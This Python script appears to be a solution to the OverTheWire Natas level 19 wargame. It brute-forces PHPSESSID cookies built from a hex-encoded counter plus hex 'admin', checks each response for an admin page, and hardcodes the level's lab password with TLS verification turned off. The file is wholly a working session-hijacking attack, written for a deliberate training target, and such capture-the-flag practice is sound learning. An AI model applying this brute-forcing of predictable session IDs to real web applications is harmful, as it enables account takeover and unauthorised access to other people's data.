import requests, re, time, sys

# =======================
# === STYLING HELPERS ===
# =======================
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

def log_info(message):
    print(f"{CYAN}[*] {message}{RESET}")

def log_success(message):
    print(f"{GREEN}[+] {message}{RESET}")


def log_progress_inline(message, color=CYAN):
    sys.stdout.write(f"\r{YELLOW}{message}{RESET}")
    sys.stdout.flush()

def log_found_inline(message):
    sys.stdout.write(f"\r{YELLOW}{message}{RESET}\n")
    sys.stdout.flush()

# ======================= 
# === CONFIG === 
url = "http://natas19.natas.labs.overthewire.org/index.php?debug"
username = "natas19"
natas19_password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
phpsesidMax = 640
phpsesidMin = 1
# =============

log_info("Starting brute-force on natas19...")

while phpsesidMin <= phpsesidMax:

    adminHex = "61646d696e"
    stringHex = "".join("{:02x}".format(ord(c)) for c in str(phpsesidMin)) + adminHex

    sesID = "PHPSESSID=" + stringHex 
    log_progress_inline(sesID)

    headers = {'Cookie': sesID}
    response = requests.get(url,headers=headers, auth=(username,natas19_password),verify=False)

    if "You are an admin" in response.text:
        print(response.text)

    phpsesidMin = phpsesidMin + 1
log_success("done")




